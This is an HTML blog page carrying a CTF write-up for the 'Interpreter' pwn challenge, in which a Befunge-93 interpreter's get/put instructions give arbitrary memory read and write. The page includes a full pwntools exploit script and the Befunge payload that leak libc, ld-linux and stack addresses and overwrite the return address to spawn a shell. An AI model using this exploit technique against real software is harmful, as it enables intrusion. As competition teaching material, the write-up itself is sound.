@@ -1,0 +1,796 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>MMA 2nd CTF 2016 – Interpreter - Hacking Tube 2.0</title>
+<meta name="description" content="Category: pwnPoints: 200">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="MMA 2nd CTF 2016 – Interpreter">
+<meta property="og:url" content="http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/">
+
+
+  <meta property="og:description" content="Category: pwnPoints: 200">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2016-09-13T00:45:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="MMA 2nd CTF 2016 – Interpreter">
+    <meta itemprop="description" content="Category: pwnPoints: 200">
+    <meta itemprop="datePublished" content="September 13, 2016">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">MMA 2nd CTF 2016 – Interpreter
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> pwn
+<strong>Points:</strong> 200</p>
+
+<!-- more -->
+
+<p>64 bit ELF, with <strong>FULL RELRO</strong>, <strong>NX</strong>, <strong>stack guard</strong> &amp; <strong>PIE</strong> enabled.<br />
+After doing some reversing, we found that it’s a <a href="https://en.wikipedia.org/wiki/Befunge">Befunge-93 program</a> interpreter. It will first read some <a href="https://en.wikipedia.org/wiki/Befunge#Befunge-93_instruction_list">Befunge-93 instructions</a> (at most 20000 characters), then interpret &amp; execute those instructions. The program will store those instructions at the <code class="highlighter-rouge">program</code> buffer, and the maximum of the executed instructions is 10000.</p>
+
+<p>Here’s the pseudo code of the main function:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// here I only list some important features of the program
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome to Online Befunge(93) Interpreter"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Please input your program."</span><span class="p">);</span>
+    <span class="n">program</span> <span class="o">=</span> <span class="n">read_program</span><span class="p">();</span> <span class="c1">// read user input to buffer 'program'
+</span>
+    <span class="n">step</span> <span class="o">=</span> <span class="mi">10001</span><span class="p">;</span>
+    <span class="n">row</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">col</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">do</span>
+    <span class="p">{</span>
+        <span class="n">ins</span> <span class="o">=</span> <span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">row</span> <span class="o">+</span> <span class="n">col</span><span class="p">]</span>
+            <span class="k">switch</span> <span class="p">(</span> <span class="n">ins</span> <span class="p">)</span>
+            <span class="p">{</span>
+                <span class="p">.....</span><span class="c1">//other instruction...
+</span>                <span class="k">case</span> <span class="sc">'&amp;'</span><span class="p">:</span> <span class="c1">// ask user for a number and push it to stack
+</span>                    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">);</span>
+                    <span class="n">push</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'.'</span><span class="p">:</span> <span class="c1">// Pop value and output as an integer followed by a space
+</span>                    <span class="n">x</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+                    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">"%d "</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="p">.....</span><span class="c1">//other instruction...
+</span>                <span class="k">case</span> <span class="sc">'*'</span><span class="p">:</span>  <span class="c1">// pop x, y, push x*y
+</span>                    <span class="n">a</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+                    <span class="n">b</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+                    <span class="n">push</span><span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                        <span class="p">.....</span><span class="c1">//other instruction...
+</span>                <span class="k">case</span> <span class="sc">'g'</span><span class="p">:</span> <span class="c1">// (get) Pop x and y, then push ASCII value of the character at that position in the program
+</span>                    <span class="n">x</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+                    <span class="n">y</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+                    <span class="n">push</span><span class="p">(</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">])</span> <span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'p'</span><span class="p">:</span> <span class="c1">// (put) Pop x, y, and z, then change the character at (x,y) in the program to the character with ASCII value z
+</span>                    <span class="n">x</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+                    <span class="n">y</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+                    <span class="n">z</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+                    <span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">z</span><span class="p">;</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">' '</span><span class="p">:</span> <span class="c1">// space = do nothing
+</span>                    <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="o">--</span><span class="n">step</span><span class="p">;</span>
+        <span class="c1">// update row &amp; column
+</span>        <span class="c1">// do other stuff...
+</span>    <span class="p">}</span><span class="k">while</span> <span class="p">(</span> <span class="n">step</span> <span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Too many steps. Is there any infinite loops?"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After we took some good look at the main function, we found that we’re able to trigger the <strong>read/write anywhere</strong> vulnerability by doing the followings:</p>
+
+<ul>
+  <li>By using the <code class="highlighter-rouge">&amp;</code>, <code class="highlighter-rouge">g</code> and <code class="highlighter-rouge">.</code> instructions, we’re able to read the content of any memory address.
+    <ul>
+      <li>Use <code class="highlighter-rouge">&amp;</code> to push an integer on the <code class="highlighter-rouge">Stack</code> (notice the uppercase S, this <code class="highlighter-rouge">Stack</code> variable is a buffer that the interpreter use to simulate the stack in a Befunge-93 program).</li>
+      <li>By doing <code class="highlighter-rouge">g</code>, the interpreter will first pop two values (let’s say <code class="highlighter-rouge">x</code> &amp; <code class="highlighter-rouge">y</code> ) from <code class="highlighter-rouge">Stack</code> and push the content of <code class="highlighter-rouge">program[80 * x + y]</code> to the <code class="highlighter-rouge">Stack</code>. Since we can control the value of <code class="highlighter-rouge">x</code> &amp; <code class="highlighter-rouge">y</code>, we can push the content of any address on Stack, and print it out by using the <code class="highlighter-rouge">.</code> instruction.</li>
+      <li>Notice that the <code class="highlighter-rouge">&amp;</code> instruction only make us able to push an integer (32 bit) on the <code class="highlighter-rouge">Stack</code>. If we want to read the content that is far away from the <code class="highlighter-rouge">program</code> buffer, the value of <code class="highlighter-rouge">x</code> &amp; <code class="highlighter-rouge">y</code> might have to be an <strong>long integer</strong>. To solve this problem, we can use the <code class="highlighter-rouge">*</code> instruction. It will pop two values (<code class="highlighter-rouge">x</code> &amp; <code class="highlighter-rouge">y</code>) from the <code class="highlighter-rouge">Stack</code> and push <code class="highlighter-rouge">x * y</code> to <code class="highlighter-rouge">Stack</code>. It uses 64 bit registers during the whole operation, thus we can use this method to place a long integer on the <code class="highlighter-rouge">Stack</code>, then use <code class="highlighter-rouge">g</code> &amp; <code class="highlighter-rouge">.</code> to leak the content of any memory address.</li>
+    </ul>
+  </li>
+  <li>With the aforementioned methods, we can also use the <code class="highlighter-rouge">p</code> instruction to overwrite the content of any memory address.</li>
+</ul>
+
+<p>So now we can leak and overwrite the content of whatever the memory address we want. The first thing we do is to leak the libc’s base address. Here I leak the address of <code class="highlighter-rouge">__libc_start_main</code>’s GOT, and use <a href="https://github.com/niklasb/libc-database">libc-database</a> to get the libc’s version.</p>
+
+<p>Now we’ll have to overwrite some address to hijack the control flow. Notice that there’s no function pointer in the program, and GOT were all read-only due to the FULL RELRO protection. The only way we can do this is to <strong>overwrite the return address.</strong></p>
+
+<p>So now we’ll have to get the stack address. But how? There’s no format string vulnerability, so it’s hard (nearly impossible) for us to leak the saved ebp or argv address on the stack. Also there’s no <code class="highlighter-rouge">malloc</code> or <code class="highlighter-rouge">mmap</code>, so it’s also impossible for us to locate the .tls section address and leak the pointer to stack which is placed in the very section.</p>
+
+<p>By the time I was solving this challenge, the only way left I know is to leak the <code class="highlighter-rouge">__libc_stack_end</code> symbol in the <code class="highlighter-rouge">ld-linux.so</code>. To achieve this I’ll have to leak the <code class="highlighter-rouge">ld-linux.so</code>’s base address from the <code class="highlighter-rouge">DT_DEBUG</code> info, which is placed in the .dynamic section of the binary. As for the version of the <code class="highlighter-rouge">ld-linux.so</code>, I just assume it’s the same version with the libc.so, which is Ubuntu 14.04, 64bit. Luckily, the actual binary can be retrieved from my other VM.</p>
+
+<p>It took me a lot of time and work to do the whole thing, and the method’s not elegant. Fortunately, it worked, and I was able to overwrite the return address with the typical x64 ROP chain: <code class="highlighter-rouge">pop_rdi --&gt; bin_sh --&gt;system</code>. At last, we are able to spawn a shell and get the flag.</p>
+
+<p>```python exp_bef.py<br />
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time
+import math</p>
+
+<p>HOST = “pwn1.chal.ctf.westerns.tokyo” 
+PORT = 62839
+ELF_PATH = “./befunge_patch”
+LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6”</p>
+
+<h1 id="setting">setting</h1>
+<p>context.arch = ‘amd64’
+context.os = ‘linux’
+context.endian = ‘little’
+context.word_size = 32
+context.log_level = ‘INFO’</p>
+
+<p>elf = ELF(ELF_PATH)
+libc = ELF(LIBC_PATH)</p>
+
+<p>def my_recvuntil(s, delim):
+    res = “”
+    while delim not in res:
+        c = s.recv(1)
+        res += c
+        sys.stdout.write(c)
+        sys.stdout.flush()
+    return res</p>
+
+<p>def myexec(cmd):
+    return subprocess.check_output(cmd, shell=True)</p>
+
+<p>def str_addr(s, f): # search string address in file
+    result = list(f.search(s+”\x00”))
+    if not len(result): # no result
+        return None
+    else:
+        return result[0]</p>
+
+<p>def leak_one_byte(off_1, off_80):
+    r.sendline(str(off_1))
+    r.sendline(str(off_80))
+    ret = r.recvuntil(“ “)
+    return int(ret)</p>
+
+<p>def leak_addr(base, off_80, name=None):
+    ret_addr = 0
+    cnt = 0
+    for i in xrange(base, base+6):
+        print “leaking %s byte : %d” % (name, cnt+1)
+        ret = leak_one_byte(i, off_80)
+        ret_addr = ret_addr | ((ret&amp;0xff) « 8*cnt)
+        cnt += 1</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return ret_addr
+</code></pre></div></div>
+
+<p>def cal_offset(addr, text_base):
+    start_from = text_base + 0x202040
+    offset = addr - start_from
+    off_80 = offset/80
+    off_1 = offset%80</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return off_1, off_80
+</code></pre></div></div>
+
+<p>def leak_far_addr(addr, text_base, name):
+    ret_addr = 0
+    cnt = 0
+    off_1, off_80 = cal_offset(addr, text_base)
+    temp = int(math.sqrt(off_80))
+    off_1 = (off_80 - temp<em>*2)</em>80 + off_1</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for i in xrange(off_1, off_1+6):
+    print "leaking %s byte : %d" % (name, cnt+1)
+    r.sendline(str(i))
+    r.sendline(str(temp))
+    r.sendline(str(temp))
+    ret = int(r.recvuntil(" "))
+    ret_addr = ret_addr | ((ret&amp;0xff) &lt;&lt; 8*cnt)
+    cnt += 1
+
+return ret_addr
+</code></pre></div></div>
+
+<p>def write_far_addr(addr, text_base, name, value):
+    cnt = 0
+    off_1, off_80 = cal_offset(addr, text_base)
+    temp = int(math.sqrt(off_80))
+    off_1 = (off_80 - temp<em>*2)</em>80 + off_1</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for i in xrange(off_1, off_1+6):
+    v = (value&gt;&gt;(8*cnt)) &amp; 0xff
+    print "writing %s byte %d : %x" % (name, cnt+1, v)
+    r.sendline(str(v))
+    r.sendline(str(i))
+    r.sendline(str(temp))
+    r.sendline(str(temp))
+    cnt += 1
+</code></pre></div></div>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#LOCAL = True
+LOCAL = False
+
+# construct befunge-93 program
+preline = myexec("wc -l ./bbb | awk '{print $1}'")
+preline = int(preline)
+f = open("./bbb", "r")
+s = f.read()
+s += "\n"*(80-preline)
+
+r, LD = None, None
+if not LOCAL:
+    r = remote(HOST, PORT)
+    LD = ELF("/mnt/files/ld-linux-x86-64.so.2")
+else:
+    r = process(ELF_PATH)
+    LD = ELF("/lib64/ld-linux-x86-64.so.2")
+
+# send program
+r.sendlineafter("&gt; ", s)
+r.recvuntil("&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; ")
+
+# leak libc
+libc_main = leak_addr(-48, -2, "libc_main")
+libc_base, system, bin_sh = None, None, None
+# for local
+if LOCAL:
+    libc.address += libc_main - libc.symbols['__libc_start_main']
+    libc_base = libc.address
+    system = libc.symbols['system']
+    bin_sh = str_addr("sh\x00", libc)
+# for remote
+else: 
+    libc_base = libc_main - 0x21e50
+    system = libc_base + 0x0000000000046590
+    bin_sh = libc_base + 0x17c8c3
+
+# leak text base
+text_base = leak_addr(-56, -9, "text_base")
+text_base -= 0xb00
+
+log.info("libc_base: "+hex(libc_base))
+log.info("text_base: "+hex(text_base))
+
+# leak r_debug
+r_debug = leak_addr(0, -7, "r_debug")
+log.info("r_debug: "+hex(r_debug))
+
+# traverse link_map structure &amp; leak ld-linux.so base address
+link_map_addr = r_debug + 8
+link_map_text = leak_far_addr(link_map_addr, text_base, "link_map_text")
+log.info("link_map_text: "+hex(link_map_text))
+link_map_vdso = leak_far_addr(link_map_text+24, text_base, "link_map_vdso")
+log.info("link_map_vdso: "+hex(link_map_vdso))
+link_map_libc = leak_far_addr(link_map_vdso+24, text_base, "link_map_libc")
+log.info("link_map_libc: "+hex(link_map_libc))
+link_map_ld = leak_far_addr(link_map_libc+24, text_base, "link_map_ld")
+log.info("link_map_ld: "+hex(link_map_ld))
+ld_base = leak_far_addr(link_map_ld, text_base, "ld_base")
+log.info("ld_base: "+hex(ld_base))
+# leak __libc_stack_end in ld-linux.so, get stack address
+LD.address += ld_base
+log.info("libc_stack_end: "+hex(LD.symbols['__libc_stack_end']))
+stack_addr = leak_far_addr(LD.symbols['__libc_stack_end'], text_base, "stack addr")
+log.info("stack_addr: "+hex(stack_addr))
+
+pop_rdi = text_base + 0x000000000000120c
+ret_addr = stack_addr - 216
+log.info("ret_addr: "+hex(ret_addr))
+log.info("pop_rdi: "+hex(pop_rdi))
+log.info("bin_sh: "+hex(bin_sh))
+log.info("system: "+hex(system))
+
+# overwrite return address
+write_far_addr(ret_addr, text_base, "ret_addr", pop_rdi)
+write_far_addr(ret_addr+8, text_base, "ret_addr+8", bin_sh)
+write_far_addr(ret_addr+16, text_base, "ret_addr+16", system)
+
+r.interactive() ``` `bbb` is the Befunge-93 program I used to exploit the service :  ```text bbb &gt;                                    v v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt; &gt;&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.            v v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt; &gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v  v                                    &lt; &gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v  v                                    &lt; &gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v  v                                    &lt; &gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v  v                                    &lt; &gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v  v                                    &lt; &gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v  v                                    &lt; &gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv v                                    &lt;  &gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv v                                    &lt;  &gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv v                                    &lt;  &gt;                                    ^ ```
+</code></pre></div></div>
+
+<p>flag : <code class="highlighter-rouge">TWCTF{It_1s_eMerG3nCy}</code></p>
+
+<p>After I pass the challenge and ask a girl from HITCON CTF team, she told me that there’s a symbol call <code class="highlighter-rouge">environ</code> in libc, which also store a stack address! And that’s the moment I realized I totally forgot to search the stack address in libc while debugging the program!<br />
+So the (way) more elegant way to solve this challenge is to leak the stack address via the <code class="highlighter-rouge">environ</code> symbol after we leak the libc’s base address. Guess I’ve still got a lot to learn in the pwn area :P</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#mma" class="page__taxonomy-item" rel="tag">MMA</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-09-13T00:45:00+08:00">September 13, 2016</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=MMA+2nd+CTF+2016+--+Interpreter%20http%3A%2F%2F0.0.0.0%3A4000%2Fmma-2nd-ctf-2016-interpreter%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fmma-2nd-ctf-2016-interpreter%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fmma-2nd-ctf-2016-interpreter%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/mma-2nd-ctf-2016-greeting/" class="pagination--pager" title="MMA 2nd CTF 2016 – greeting
+">Previous</a>
+    
+    
+      <a href="/asis-ctf-finals-2016-car-market/" class="pagination--pager" title="ASIS CTF Finals 2016 – car market
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
